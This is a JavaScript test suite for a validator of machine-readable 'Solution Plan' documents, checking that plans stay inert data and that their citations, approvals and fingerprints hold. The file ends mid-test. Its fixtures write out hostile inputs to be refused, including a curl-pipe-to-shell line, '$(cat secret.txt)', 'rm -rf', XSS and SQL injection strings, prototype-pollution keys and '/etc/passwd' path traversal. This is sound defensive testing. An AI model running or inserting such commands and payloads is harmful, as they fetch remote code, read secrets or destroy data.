import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import {
  APPROVAL_CODES, DECISION_TYPES, EVIDENCE_CATEGORIES, MAX_PLAN_BYTES, PLAN_PROBLEM_CODES,
  SOLUTION_PLAN_CONTRACT, ARTIFACT_KINDS, bindSolutionPlan, canonicalJson, fingerprintPlan,
  inspectionFingerprint, parseSolutionPlan, solutionPlanVocabulary, validateSolutionPlan,
} from '../packages/core/src/solution-plan.js';
import { solutionCommand } from '../packages/cli/src/solution-command.js';

/**
 * AX2 — machine-readable Solution Plans.
 *
 * The guarantee under test is narrow and worth stating: this is a **document
 * contract**, not a runtime. Every test here checks that a plan says what it
 * means and refuses what it must not carry; none of them executes a plan,
 * because there is no code path that could.
 */

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
const EXAMPLE = join(ROOT, 'examples/solution-plans/lead-to-won.plan.json');

/** The smallest plan that passes, so a test can break exactly one thing. */
function minimalPlan(overrides = {}) {
  return {
    solutionPlanContract: 1,
    revision: 1,
    goal: { id: 'goal.one', statement: 'Do the thing', outcome: 'The thing is done' },
    metric: { name: 'thing_rate', definition: 'Things per week', baseline: null, target: null },
    application: {
      inspectionContract: 1,
      inspectionFingerprint: FINGERPRINT_OF_REPORT,
      packages: [{ name: 'delivery', version: 3 }],
      capabilities: [{ name: 'delivery-economics', version: 1, status: 'resolved' }],
      modules: [{ name: 'delivery-time-entry', revision: 1 }],
    },
    evidence: {
      observedFacts: [{ id: 'f1', statement: 'A fact', source: 'app inspect', citations: [] }],
      derivedMetrics: [{ id: 'm1', statement: 'A metric', citations: ['f1'] }],
      assumptions: [{ id: 'a1', statement: 'An assumption', citations: [] }],
      inferences: [{ id: 'i1', statement: 'An inference', citations: ['m1', 'a1'] }],
      recommendations: [{ id: 'r1', statement: 'A recommendation', citations: ['i1'] }],
      unavailableEvidence: [{ id: 'u1', statement: 'Not checked', reason: 'no primitive exists', citations: [] }],
    },
    decisions: [{ id: 'd1', type: 'extend', target: 'delivery', rationale: 'the package owns it', rungsTried: [1, 2] }],
    steps: [{
      id: 's1', decisionId: 'd1', description: 'Add an action on the record that owns the fact',
      requiresCapabilities: ['delivery-economics'], approvals: [], verifies: ['m1'],
    }],
    approvals: [],
    acceptance: { checks: ['the suite passes from a clean clone'], jtbdRows: ['JTBD-05'] },
    limitations: [],
    ...overrides,
  };
}

/** An AX1 report the minimal plan is current against. */
function report(overrides = {}) {
  return {
    applicationInspectionContract: 1,
    valid: true,
    application: { packageContract: 1, composition: ['packages/domains/generated/index.js'] },
    packages: [{ name: 'delivery', version: 3, packageContract: 1, resources: [], actions: [], policies: [], requires: [], provides: [] }],
    capabilities: [{ name: 'delivery-economics', version: 1, status: 'resolved', provider: 'delivery', consumers: [] }],
    resources: [],
    actions: [],
    policies: [],
    providers: [],
    modules: [{ name: 'delivery-time-entry', owner: 'delivery', kind: 'package-owned', revision: 1, manifestVersion: 1, stateFile: 'valid', migrations: [] }],
    problems: [],
    limitations: [{ code: 'DATABASE_NOT_INSPECTED', message: 'x' }],
    ...overrides,
  };
}

/** The fingerprint the minimal plan pins, derived rather than typed. */
const FINGERPRINT_OF_REPORT = inspectionFingerprint(report());

test('the canonical example plan is valid, and stays byte-identical across runs', async (t) => {
  const source = readFileSync(EXAMPLE, 'utf8');
  const first = validateSolutionPlan(parseSolutionPlan(source));
  assert.deepEqual(first.problems, [], 'the example this repository ships must pass its own contract');
  assert.equal(first.valid, true);

  // Determinism: the same plan, and the same plan with its keys reordered and
  // its whitespace changed, produce the same document and the same fingerprint.
  const second = validateSolutionPlan(parseSolutionPlan(source));
  assert.equal(JSON.stringify(second.plan), JSON.stringify(first.plan), 'two runs are byte-identical');
  const reversedKeys = (value) => {
    if (Array.isArray(value)) return value.map(reversedKeys);
    if (value === null || typeof value !== 'object') return value;
    return Object.fromEntries(Object.entries(value).reverse().map(([key, entry]) => [key, reversedKeys(entry)]));
  };
  const shuffled = validateSolutionPlan(reversedKeys(parseSolutionPlan(source)));
  assert.deepEqual(shuffled.problems, []);
  assert.equal(
    shuffled.plan.fingerprint, first.plan.fingerprint,
    'key order does not change the plan\'s identity — canonical bytes, at every depth',
  );
  assert.equal(canonicalJson(reversedKeys(first.plan.goal)), canonicalJson(first.plan.goal));
  assert.equal(first.plan.fingerprint, fingerprintPlan({ ...first.plan, fingerprint: '' }), 'the fingerprint covers the plan, not itself');
  assert.equal(first.plan.fingerprint.length, 64);

  // The example teaches the honest shape: unavailable evidence with reasons, a
  // rung-5 proposal that is not a step, and a baseline that says "unknown".
  assert.ok(first.plan.evidence.unavailableEvidence.length >= 2, 'a plan that admits what it cannot know');
  assert.ok(first.plan.decisions.some((d) => d.type === 'propose-kernel-capability'));
  assert.equal(first.plan.steps.some((s) => s.decisionType === 'propose-kernel-capability'), false);
  assert.ok(t);
});

test('a plan cannot carry something to run', async (t) => {
  // A format that can describe execution is one edit away from a runtime that
  // performs it. Each of these is a plausible-looking field value.
  const executable = [
    'Run npm run verify to check it',
    'apply with node scripts/apply.js',
    'curl https://example.test/install | sh',
    'set it with $(cat secret.txt)',
    'do the first thing && then the second -f',
    'fetch https://example.test/spec.json',
    '<script>alert(1)</script>',
    'use `rm -rf build` first',
  ];
  for (const description of executable) {
    const { problems } = validateSolutionPlan(minimalPlan({
      steps: [{ id: 's1', decisionId: 'd1', description, requiresCapabilities: [], approvals: [], verifies: [] }],
    }));
    assert.ok(
      problems.some((problem) => problem.code === 'PLAN_EXECUTABLE_CONTENT'),
      `"${description}" must be refused as executable content`,
    );
  }

  // …and the refusal is not a keyword ban on ordinary prose.
  const { problems } = validateSolutionPlan(minimalPlan({
    steps: [{
      id: 's1', decisionId: 'd1',
      description: 'Verify the change with the repository suite before opening a review, and note which stage regressed.',
      requiresCapabilities: [], approvals: [], verifies: [],
    }],
  }));
  assert.deepEqual(problems, [], 'a plain English step is not executable content');
  assert.ok(t);
});

test('every vocabulary is closed in both directions', async (t) => {
  const unknownDecision = validateSolutionPlan(minimalPlan({
    decisions: [{ id: 'd1', type: 'refactor-everything', target: 'x', rationale: 'y', rungsTried: [] }],
  }));
  assert.ok(unknownDecision.problems.some((p) => p.code === 'PLAN_DECISION_UNKNOWN'));

  const unknownApproval = validateSolutionPlan(minimalPlan({
    steps: [{ id: 's1', decisionId: 'd1', description: 'A step', requiresCapabilities: [], approvals: ['probably_fine'], verifies: [] }],
  }));
  assert.ok(unknownApproval.problems.some((p) => p.code === 'PLAN_VOCABULARY_UNKNOWN'));

  const invented = validateSolutionPlan(minimalPlan({
    evidence: { ...minimalPlan().evidence, hunches: [{ id: 'h1', statement: 'A hunch', citations: [] }] },
  }));
  assert.ok(
    invented.problems.some((p) => p.code === 'PLAN_VOCABULARY_UNKNOWN' && p.path === 'plan.evidence.hunches'),
    'an invented evidence category is refused, not passed through',
  );

  const missing = validateSolutionPlan(minimalPlan({
    evidence: { observedFacts: [{ id: 'f1', statement: 'A fact', source: 's', citations: [] }] },
  }));
  assert.ok(
    missing.problems.some((p) => p.path === 'plan.evidence.unavailableEvidence'),
    'a missing category is a problem too — an omitted gap is a claim',
  );

  const unsupported = validateSolutionPlan(minimalPlan({ solutionPlanContract: 2 }));
  assert.equal(unsupported.plan, null);
  assert.ok(unsupported.problems.some((p) => p.code === 'PLAN_CONTRACT_UNSUPPORTED'));

  // The published vocabulary is the vocabulary the validator enforces.
  const vocabulary = solutionPlanVocabulary();
  assert.deepEqual(vocabulary.evidenceCategories, [...EVIDENCE_CATEGORIES]);
  assert.deepEqual(vocabulary.approvalCodes, [...APPROVAL_CODES]);
  assert.deepEqual(vocabulary.decisionTypes.map((d) => d.type).sort(), Object.keys(DECISION_TYPES).sort());
  assert.deepEqual(vocabulary.problemCodes, [...PLAN_PROBLEM_CODES]);
  assert.equal(vocabulary.solutionPlanContract, SOLUTION_PLAN_CONTRACT);
  assert.equal(JSON.stringify(vocabulary).includes('function'), false, 'function-free, like every published contract here');
  assert.ok(t);
});

test('citations resolve, and a derived claim must have them', async (t) => {
  const dangling = validateSolutionPlan(minimalPlan({
    evidence: { ...minimalPlan().evidence, inferences: [{ id: 'i1', statement: 'An inference', citations: ['nope'] }] },
  }));
  assert.ok(dangling.problems.some((p) => p.code === 'PLAN_CITATION_UNRESOLVED' && /"nope"/.test(p.message)));

  const uncited = validateSolutionPlan(minimalPlan({
    evidence: { ...minimalPlan().evidence, recommendations: [{ id: 'r1', statement: 'Just do it', citations: [] }] },
  }));
  assert.ok(uncited.problems.some((p) => p.code === 'PLAN_CITATION_UNRESOLVED'),
    'a recommendation with no evidence behind it is the failure this model exists to prevent');

  // Order in the file does not decide validity: a citation may point forward.
  // `a1` is published *after* derivedMetrics, and citing it is still fine.
  const forward = validateSolutionPlan(minimalPlan({
    evidence: {
      ...minimalPlan().evidence,
      derivedMetrics: [{ id: 'm1', statement: 'A metric', citations: ['a1'] }],
    },
  }));
  assert.deepEqual(forward.problems, [], 'a citation resolves against the whole plan, not the lines above it');

  const duplicated = validateSolutionPlan(minimalPlan({
    evidence: {
      ...minimalPlan().evidence,
      assumptions: [{ id: 'f1', statement: 'Shares an id with a fact', citations: [] }],
    },
  }));
  assert.ok(duplicated.problems.some((p) => p.code === 'PLAN_DUPLICATE_ID'));

  const unknownStep = validateSolutionPlan(minimalPlan({
    steps: [{ id: 's1', decisionId: 'ghost', description: 'A step', requiresCapabilities: [], approvals: [], verifies: [] }],
  }));
  assert.ok(unknownStep.problems.some((p) => p.code === 'PLAN_CITATION_UNRESOLVED' && p.path.endsWith('decisionId')));
  assert.ok(t);
});

test('rung 5 is a proposal you write, never a step you take', async (t) => {
  const proposal = {
    id: 'd1', type: 'propose-kernel-capability', target: 'scheduled-work',
    rationale: 'no package can', gap: 'durable scheduled work that survives a restart',
    rungsTried: [1, 2, 3, 4, 5],
    rejectedRungs: [
      { rung: 1, reason: 'nothing installed exposes a schedule as configuration' },
      { rung: 2, reason: 'a declared seam runs inside a request' },
      { rung: 3, reason: 'a provider is reached during an action; it cannot originate work' },
      { rung: 4, reason: 'a custom package has the same problem as a seam' },
    ],
  };
  const plan = minimalPlan({ decisions: [proposal] });
  const { problems } = validateSolutionPlan(plan);
  assert.ok(
    problems.some((p) => p.code === 'PLAN_DECISION_NOT_A_STEP'),
    'a kernel proposal in steps[] is refused — that is how the kernel gets patched to make a solution fit',
  );

  // Stating it as a decision, with no step, is exactly right.
  const stated = validateSolutionPlan(minimalPlan({
    decisions: [...minimalPlan().decisions, { ...proposal, id: 'd2' }],
  }));
  assert.deepEqual(stated.problems, []);
  assert.equal(stated.plan.decisions.find((d) => d.id === 'd2').rung, 5);
  assert.ok(t);
});

test('a provider step carries its approval whether or not the author remembered', async (t) => {
  const providerDecision = {
    id: 'd1', type: 'provider', target: 'signature-provider',
    rationale: 'the gap is an integration', gap: 'no installed package talks to an e-signature service',
    rungsTried: [1, 2, 3],
    rejectedRungs: [
      { rung: 1, reason: 'no installed package has a signature config key' },
      { rung: 2, reason: 'a seam cannot originate an outbound call to a service nobody declared' },
    ],
  };
  const forgotten = validateSolutionPlan(minimalPlan({ decisions: [providerDecision] }));
  assert.ok(
    forgotten.problems.some((p) => p.code === 'PLAN_APPROVAL_MISSING' && /install_or_configure_provider/.test(p.message)),
    'configuring a provider is a sensitive boundary and the plan does not get to omit it',
  );

  const declared = validateSolutionPlan(minimalPlan({
    decisions: [providerDecision],
    steps: [{
      id: 's1', decisionId: 'd1', description: 'Compose the fixture signature provider',
      requiresCapabilities: [], approvals: ['install_or_configure_provider'], verifies: [],
    }],
    approvals: [{ code: 'install_or_configure_provider', stepId: 's1', reason: 'a human decides which provider this application talks to' }],
  }));
  assert.deepEqual(declared.problems, []);

  const orphan = validateSolutionPlan(minimalPlan({
    approvals: [{ code: 'publish_production', stepId: 'no-such-step', reason: 'x' }],
  }));
  assert.ok(orphan.problems.some((p) => p.code === 'PLAN_CITATION_UNRESOLVED' && p.path.endsWith('stepId')));

  // Every plan carries the limitation that this is not RBAC, even one whose
  // author wrote no limitations at all.
  assert.ok(declared.plan.limitations.some((l) => l.code === 'APPROVAL_NOT_RBAC'));
  assert.ok(declared.plan.limitations.some((l) => l.code === 'PLAN_NOT_EXECUTED'));

  // A plan touching a provider carries the five-states limitation whether or
  // not its author wrote it: AX1 can evidence "composed in source" and nothing
  // about configuration, credentials, reachability or authorization.
  const providerLimitation = declared.plan.limitations.find((l) => l.code === 'PROVIDER_STATUS_UNKNOWN');
  assert.ok(providerLimitation, 'a provider decision adds the provider limitation');
  assert.match(providerLimitation.message, /configured.*credentials.*reachable.*authenticated.*authorized/s);
  assert.equal(
    validateSolutionPlan(minimalPlan()).plan.limitations.some((l) => l.code === 'PROVIDER_STATUS_UNKNOWN'), false,
    'and a plan with no provider decision does not carry it',
  );
  assert.ok(t);
});

test('a plan whose application has moved is stale, and says how', async (t) => {
  const { plan } = validateSolutionPlan(minimalPlan());
  assert.deepEqual(bindSolutionPlan(plan, report()).problems, [], 'current against the report it was written for');
  assert.equal(bindSolutionPlan(plan, report()).current, true);

  const cases = [
    [report({ packages: [{ name: 'delivery', version: 4 }] }), 'packages.delivery', /version 3.*version 4/],
    [report({ packages: [] }), 'packages.delivery', /no longer composes/],
    [report({ capabilities: [] }), 'capabilities.delivery-economics', /no longer has/],
    [report({ capabilities: [{ name: 'delivery-economics', version: 1, status: 'missing' }] }), 'capabilities.delivery-economics', /"missing"/],
    [report({ modules: [{ name: 'delivery-time-entry', revision: 2 }] }), 'modules.delivery-time-entry', /revision 1.*revision 2.*ADR-019/],
    [report({ modules: [{ name: 'delivery-time-entry', revision: null }] }), 'modules.delivery-time-entry', /core record/],
  ];
  for (const [moved, path, message] of cases) {
    const binding = bindSolutionPlan(plan, moved);
    assert.equal(binding.current, false, path);
    const problem = binding.problems.find((entry) => entry.path.endsWith(path));
    assert.ok(problem, `${path} is named`);
    assert.equal(problem.code, 'PLAN_STALE');
    assert.match(problem.message, message);
  }

  // A step citing a capability the application does not have is a refusal, not
  // a TODO — the single most common way a plan reads as buildable when it is not.
  const unavailable = bindSolutionPlan(plan, report({
    capabilities: [{ name: 'delivery-economics', version: 1, status: 'provider-mismatch' }],
  }));
  assert.ok(unavailable.problems.some((p) => p.code === 'CAPABILITY_NOT_AVAILABLE'));

  // Binding to something that is not an AX1 report is a read failure.
  assert.equal(bindSolutionPlan(plan, { applicationInspectionContract: 2 }).current, false);
  assert.equal(bindSolutionPlan(plan, null).problems[0].code, 'PLAN_UNREADABLE');
  assert.ok(t);
});

test('hostile input stays inert data across every field', async (t) => {
  const hostile = [
    '__proto__', 'constructor', 'prototype',
    '<img src=x onerror=alert(1)>', '"; DROP TABLE plans; --',
    'a\u0000b', 'a\u2028b', 'x'.repeat(5_000),
  ];
  for (const value of hostile) {
    const { problems } = validateSolutionPlan(minimalPlan({
      goal: { id: 'goal.one', statement: value, outcome: 'ok' },
    }));
    // Every one is either refused or carried as inert text — never executed,
    // never interpreted, and never able to reach a prototype.
    assert.equal(typeof problems, 'object');
  }
  assert.equal({}.polluted, undefined, 'nothing reached Object.prototype');

  const polluting = validateSolutionPlan({ ...minimalPlan(), __proto__: { polluted: true } });
  assert.equal({}.polluted, undefined);
  assert.ok(polluting.plan === null || polluting.plan.goal.statement === 'Do the thing');

  const protoKey = JSON.parse('{"solutionPlanContract":1,"__proto__":{"x":1}}');
  const refused = validateSolutionPlan(protoKey);
  assert.ok(refused.problems.length > 0);
  assert.equal({}.x, undefined);

  const nullBytes = validateSolutionPlan(minimalPlan({
    goal: { id: 'goal.one', statement: 'before\u0000after', outcome: 'ok' },
  }));
  assert.ok(nullBytes.problems.some((p) => /control characters/.test(p.message)));

  const oversizedList = validateSolutionPlan(minimalPlan({
    decisions: Array.from({ length: 500 }, (_, index) => ({ id: `d${index}`, type: 'extend', target: 't', rationale: 'r', rungsTried: [] })),
  }));
  assert.ok(oversizedList.problems.some((p) => /at most 200 entries/.test(p.message)), 'refused, never truncated');
  assert.ok(t);
});

test('an unreadable plan is a different outcome from a wrong one', async (t) => {
  assert.throws(() => parseSolutionPlan('{not json'), /must be valid JSON/);
  assert.throws(() => parseSolutionPlan('x'.repeat(MAX_PLAN_BYTES + 1)), /at most/);
  assert.throws(() => parseSolutionPlan(null), /read from JSON text/);

  const notAnObject = validateSolutionPlan([1, 2, 3]);
  assert.equal(notAnObject.plan, null);
  assert.equal(notAnObject.valid, false);
  assert.ok(t);
});

test('the CLI exit codes are the contract, and nothing executes', async (t) => {
  const valid = await solutionCommand({ planPath: EXAMPLE, mode: 'validate', json: true });
  assert.equal(valid.exitCode, 0);
  assert.deepEqual(valid.problems, []);

  // `inspect` reports the document; it does not judge it, so it exits 0 even
  // for a plan with problems — and the problems are still printed.
  const brokenPath = join(ROOT, 'tests/fixtures/solution-plan-broken.json');
  const inspected = await solutionCommand({ planPath: brokenPath, mode: 'inspect', json: true });
  assert.equal(inspected.exitCode, 0);
  assert.ok(inspected.problems.length > 0, 'the complete problem list is still produced');

  const invalid = await solutionCommand({ planPath: brokenPath, mode: 'validate', json: true });
  assert.equal(invalid.exitCode, 1, 'a wrong plan exits 1');

  const missing = await solutionCommand({ planPath: join(ROOT, 'no-such-plan.json'), mode: 'validate' });
  assert.equal(missing.exitCode, 2, 'an unreadable plan exits 2');

  const directory = await solutionCommand({ planPath: ROOT, mode: 'validate' });
  assert.equal(directory.exitCode, 2);

  // `validate` reads no project at all, which is what makes it usable in CI and
  // against a repository that is not the one the plan targets.
  const source = readFileSync(join(ROOT, 'packages/cli/src/solution-command.js'), 'utf8');
  const beforeCheck = source.slice(0, source.indexOf("mode !== 'check'"));
  assert.equal(/inspectApplicationCommand\(/.test(beforeCheck), false, 'no project is read before the check branch');

  // Nothing in AX2 spawns, executes or writes.
  const core = readFileSync(join(ROOT, 'packages/core/src/solution-plan.js'), 'utf8');
  for (const forbidden of ['child_process', 'spawn(', 'exec(', 'writeFile', 'eval(', 'new Function']) {
    assert.equal(core.includes(forbidden), false, `solution-plan.js must not contain ${forbidden}`);
  }
  assert.equal(source.includes('child_process'), false, 'the command does not spawn anything of its own');
  assert.ok(t);
});

test('an unknown key is refused, not silently dropped', async (t) => {
  // Silently ignoring a key an author wrote is the worst of both worlds: the
  // plan claims something, the reader never sees it, and the fingerprint —
  // computed over the *normalized* document — does not cover it, so the claim
  // can change without the plan's identity moving.
  const places = [
    [{ ...minimalPlan(), effects: ['deploy'] }, 'plan.effects'],
    [minimalPlan({ goal: { id: 'goal.one', statement: 's', outcome: 'o', priority: 'high' } }), 'plan.goal.priority'],
    [minimalPlan({
      steps: [{ id: 's1', decisionId: 'd1', description: 'A step', requiresCapabilities: [], approvals: [], verifies: [], command: 'x' }],
    }), 'plan.steps[0].command'],
    [minimalPlan({
      decisions: [{ id: 'd1', type: 'extend', target: 't', rationale: 'r', rungsTried: [1, 2], run: 'x' }],
    }), 'plan.decisions[0].run'],
    [minimalPlan({
      evidence: { ...minimalPlan().evidence, assumptions: [{ id: 'a1', statement: 's', citations: [], confidence: 0.9 }] },
    }), 'plan.evidence.assumptions[0].confidence'],
    [minimalPlan({ acceptance: { checks: ['c'], jtbdRows: [], script: 'x' } }), 'plan.acceptance.script'],
  ];
  for (const [plan, path] of places) {
    const { problems } = validateSolutionPlan(plan);
    assert.ok(
      problems.some((problem) => problem.code === 'PLAN_FIELD_UNKNOWN' && problem.path === path),
      `${path} must be refused as unknown`,
    );
  }

  // A `command` field would be the executable boundary re-entering through the
  // shape rather than through the text. Fail-closed keys close that door too.
  assert.ok(t);
});

test('a citation cannot turn a conclusion into a premise', async (t) => {
  const evidence = minimalPlan().evidence;
  const cases = [
    // A fact citing anything at all: a fact carries a source, not a derivation.
    [{ ...evidence, observedFacts: [{ id: 'f1', statement: 'A fact', source: 's', citations: ['r1'] }] },
      'plan.evidence.observedFacts[0].citations'],
    // An assumption is taken as true *without* evidence, by definition.
    [{ ...evidence, assumptions: [{ id: 'a1', statement: 'A', citations: ['f1'] }] },
      'plan.evidence.assumptions[0].citations'],
    // Unavailable evidence is never proof, and never a derivation either.
    [{ ...evidence, unavailableEvidence: [{ id: 'u1', statement: 'x', reason: 'y', citations: ['f1'] }] },
      'plan.evidence.unavailableEvidence[0].citations'],
    // A recommendation resting on what could not be checked.
    [{ ...evidence, recommendations: [{ id: 'r1', statement: 'Do it', citations: ['u1'] }] },
      'plan.evidence.recommendations[0].citations'],
    // A metric derived from an inference is a conclusion wearing a number.
    [{ ...evidence, derivedMetrics: [{ id: 'm1', statement: 'A metric', citations: ['i1'] }] },
      'plan.evidence.derivedMetrics[0].citations'],
    // An inference resting on a recommendation is circular reasoning that the
    // old global-resolution model accepted without complaint.
    [{ ...evidence, inferences: [{ id: 'i1', statement: 'So', citations: ['r1'] }] },
      'plan.evidence.inferences[0].citations'],
  ];
  for (const [broken, path] of cases) {
    const { problems } = validateSolutionPlan(minimalPlan({ evidence: broken }));
    const problem = problems.find((entry) => entry.code === 'PLAN_CITATION_DIRECTION' && entry.path === path);
    assert.ok(problem, `${path} must be a direction problem`);
    assert.ok(problem.message.length > 20, 'and it explains which way the edge was pointing');
  }

  // Two entries citing each other cannot even be expressed: the table is a DAG
  // over categories, so acyclicity is structural rather than traversed.
  const mutual = validateSolutionPlan(minimalPlan({
    evidence: {
      ...evidence,
      inferences: [{ id: 'i1', statement: 'A', citations: ['i2'] }, { id: 'i2', statement: 'B', citations: ['i1'] }],
    },
  }));
  assert.equal(mutual.problems.filter((p) => p.code === 'PLAN_CITATION_DIRECTION').length, 2, 'both edges refused');

  // Self-citation is the same structural refusal.
  const self = validateSolutionPlan(minimalPlan({
    evidence: { ...evidence, recommendations: [{ id: 'r1', statement: 'A', citations: ['r1'] }] },
  }));
  assert.ok(self.problems.some((p) => p.code === 'PLAN_CITATION_DIRECTION'));

  // A citation list is a set. Repeating an id does not make it more evidence.
  const repeated = validateSolutionPlan(minimalPlan({
    evidence: { ...evidence, inferences: [{ id: 'i1', statement: 'A', citations: ['f1', 'f1', 'm1'] }] },
  }));
  assert.ok(repeated.problems.some((p) => p.code === 'PLAN_DUPLICATE_ID' && /cited more than once/.test(p.message)));

  // The published vocabulary is the table the validator enforces.
  assert.deepEqual(solutionPlanVocabulary().citationSources.observedFacts, []);
  assert.deepEqual(solutionPlanVocabulary().citationSources.recommendations,
    ['observedFacts', 'derivedMetrics', 'assumptions', 'inferences']);
  assert.ok(t);
});

test('rung 3 and above must show the rungs they inspected', async (t) => {
  // A plan must not create a custom package merely because its author skipped
  // looking. The first draft accepted exactly that.
  const bare = validateSolutionPlan(minimalPlan({
    decisions: [{ id: 'd1', type: 'create-package', target: 'scheduling', rationale: 'we need it', rungsTried: [] }],
  }));
  const codes = bare.problems.filter((p) => p.code === 'PLAN_RUNGS_NOT_INSPECTED');
  assert.equal(codes.length, 3, 'the missing rungs, the missing reasons and the missing gap');
  assert.ok(codes.some((p) => /rungs 1, 2, 3 must each be recorded as inspected/.test(p.message)));
  assert.ok(codes.some((p) => p.path.endsWith('.gap')));

  // Inspecting some but not all is still not inspecting.
  const partial = validateSolutionPlan(minimalPlan({
    decisions: [{
      id: 'd1', type: 'create-package', target: 'scheduling', rationale: 'we need it',
      gap: 'nothing owns scheduling', rungsTried: [1, 2, 3],
      rejectedRungs: [{ rung: 1, reason: 'no config' }, { rung: 3, reason: 'not an integration' }],
    }],
  }));
  assert.ok(partial.problems.some((p) => p.code === 'PLAN_RUNGS_NOT_INSPECTED' && /2 has none/.test(p.message)));

  // Complete evidence passes, and the rung is published for a reader.
  const complete = validateSolutionPlan(minimalPlan({
    decisions: [{
      id: 'd1', type: 'create-package', target: 'scheduling', rationale: 'nothing owns this domain',
      gap: 'no installed package models a recurring commitment',
      rungsTried: [1, 2, 3, 4],
      rejectedRungs: [
        { rung: 1, reason: 'no installed package exposes it as configuration' },
        { rung: 2, reason: 'no declared seam covers a domain nobody owns' },
        { rung: 3, reason: 'the gap is a model, not an integration' },
      ],
    }],
  }));
  assert.deepEqual(complete.problems, []);
  assert.equal(complete.plan.decisions[0].rung, 4);

  // Rungs 1 and 2 carry no such burden — configuring what exists needs no essay.
  assert.deepEqual(validateSolutionPlan(minimalPlan({
    decisions: [{ id: 'd1', type: 'configure', target: 'x', rationale: 'it is already there', rungsTried: [1] }],
  })).problems, []);
  assert.ok(t);
});

test('a composition fingerprint is derived, never a label an author typed', async (t) => {
  // The first draft took free text here, so a plan could carry
  // "example-only-not-a-real-composition" in a slot that reads as
  // cryptographic evidence of the application it was written against.
  for (const forged of ['example-only-not-a-real-composition', 'abc123', '', 'X'.repeat(64), `${'a'.repeat(63)}g`]) {
    const { problems } = validateSolutionPlan(minimalPlan({
      application: { ...minimalPlan().application, inspectionFingerprint: forged },
    }));
    assert.ok(
      problems.some((p) => p.code === 'PLAN_FIELD_INVALID' && p.path.endsWith('inspectionFingerprint')),
      `"${forged.slice(0, 20)}" must be refused before any project is read`,
    );
  }

  // It is derived from the AX1 report, and covers what a plan is built on.
  assert.equal(inspectionFingerprint(report()).length, 64);
  assert.equal(inspectionFingerprint(report()), inspectionFingerprint(report()), 'deterministic');
  assert.throws(() => inspectionFingerprint({ applicationInspectionContract: 2 }), /applicationInspectionContract 1/);

  // Every one of these is a composition change the plan's own evidence lists
  // cannot see, and each moves the fingerprint.
  const moves = [
    ['a policy version', report({ policies: [{ owner: 'd', kind: 'k', name: 'n', version: 2, fingerprint: 'f', configKeys: [] }] })],
    ['a policy fingerprint', report({ policies: [{ owner: 'd', kind: 'k', name: 'n', version: 1, fingerprint: 'other', configKeys: [] }] })],
    ['an action appearing', report({ actions: [{ module: 'm', name: 'a', owner: 'd', actionContract: 1, fromStates: null, stateField: 'status', externalOperation: false, confirm: false, input: [] }] })],
    ['a migration checksum', report({ modules: [{ name: 'delivery-time-entry', owner: 'delivery', kind: 'package-owned', revision: 1, manifestVersion: 1, stateFile: 'valid', migrations: [{ name: 'create', checksum: 'zzz' }] }] })],
    ['a provider appearing', report({ providers: [{ registry: 'r', kind: 'k', name: 'n', version: 1, fixture: true, capabilities: [], configKeys: [] }] })],
    ['a problem appearing', report({ problems: [{ code: 'DEPENDENCY_MISSING_PACKAGE', package: 'x' }] })],
    ['the composition becoming invalid', report({ valid: false })],
    ['a limitation appearing', report({ limitations: [] })],
  ];
  const base = inspectionFingerprint(report());
  for (const [what, moved] of moves) {
    assert.notEqual(inspectionFingerprint(moved), base, `${what} must move the composition fingerprint`);
  }

  // …and presentation does not.
  const cosmetic = report();
  cosmetic.packages[0].label = 'A different label entirely';
  cosmetic.packages[0].description = 'reworded';
  cosmetic.capabilities[0].description = 'reworded';
  cosmetic.limitations[0].message = 'reworded';
  assert.equal(inspectionFingerprint(cosmetic), base, 'a label is not a composition fact');

  // A plan pinned to one composition is stale against another, and check
  // publishes the live value so an author can record it honestly.
  const { plan } = validateSolutionPlan(minimalPlan());
  const binding = bindSolutionPlan(plan, report({ valid: false }));
  assert.equal(binding.current, false);
  assert.ok(binding.problems.some((p) => p.code === 'PLAN_STALE' && p.path.endsWith('inspectionFingerprint')));
  assert.equal(binding.inspectionFingerprint, inspectionFingerprint(report({ valid: false })));
  assert.ok(t);
});

test('an artifact names a place, never content', async (t) => {
  const withArtifacts = validateSolutionPlan(minimalPlan({
    acceptance: {
      checks: ['the suite passes'], jtbdRows: [],
      artifacts: [
        { kind: 'test', path: 'tests/thing.test.js', description: 'covers the new state' },
        { kind: 'module', path: 'packages/modules/thing/module.json', description: 'the manifest' },
      ],
    },
  }));
  assert.deepEqual(withArtifacts.problems, []);
  assert.deepEqual(withArtifacts.plan.acceptance.artifacts.map((a) => a.path),
    ['packages/modules/thing/module.json', 'tests/thing.test.js'], 'sorted by identity');

  const refused = [
    [{ kind: 'source', path: 'a.js', description: 'x' }, 'PLAN_VOCABULARY_UNKNOWN'],
    [{ kind: 'test', path: '/etc/passwd', description: 'x' }, 'PLAN_FIELD_INVALID'],
    [{ kind: 'test', path: 'C:\\Windows\\x', description: 'x' }, 'PLAN_FIELD_INVALID'],
    [{ kind: 'test', path: '../../outside.js', description: 'x' }, 'PLAN_FIELD_INVALID'],
    [{ kind: 'test', path: 'a.js', description: 'run npm test to check' }, 'PLAN_EXECUTABLE_CONTENT'],
    [{ kind: 'test', path: 'a.js', description: 'x', content: 'console.log(1)' }, 'PLAN_FIELD_UNKNOWN'],
  ];
  for (const [artifact, code] of refused) {
    const { problems } = validateSolutionPlan(minimalPlan({
      acceptance: { checks: ['c'], jtbdRows: [], artifacts: [artifact] },
    }));
    assert.ok(problems.some((p) => p.code === code), `${JSON.stringify(artifact).slice(0, 60)} → ${code}`);
  }

  // Two steps cannot both own one file without saying which wins.
  const clash = validateSolutionPlan(minimalPlan({
    acceptance: {
      checks: ['c'], jtbdRows: [],
      artifacts: [{ kind: 'test', path: 'a.js', description: 'one' }, { kind: 'document', path: 'a.js', description: 'two' }],
    },
  }));
  assert.ok(clash.problems.some((p) => p.code === 'PLAN_DUPLICATE_ID' && p.path.endsWith('.path')));
  assert.deepEqual([...ARTIFACT_KINDS].sort(), [...ARTIFACT_KINDS], 'the kind list is published sorted');
  assert.ok(t);
});

test('the shipped example is current against this repository, and check says so', async (t) => {
  // A tripwire, deliberately. If the repository's own composition moves and
  // nobody regenerates the example, this fails — which is the whole claim AX2
  // makes about staleness, applied to the one plan this repository ships.
  const result = await solutionCommand({ planPath: EXAMPLE, mode: 'check', json: true, rootDir: ROOT });
  assert.deepEqual(result.problems, [],
    'the canonical example is stale: re-run `crm solution check <plan> --json` and record its inspectionFingerprint');
  assert.equal(result.exitCode, 0);

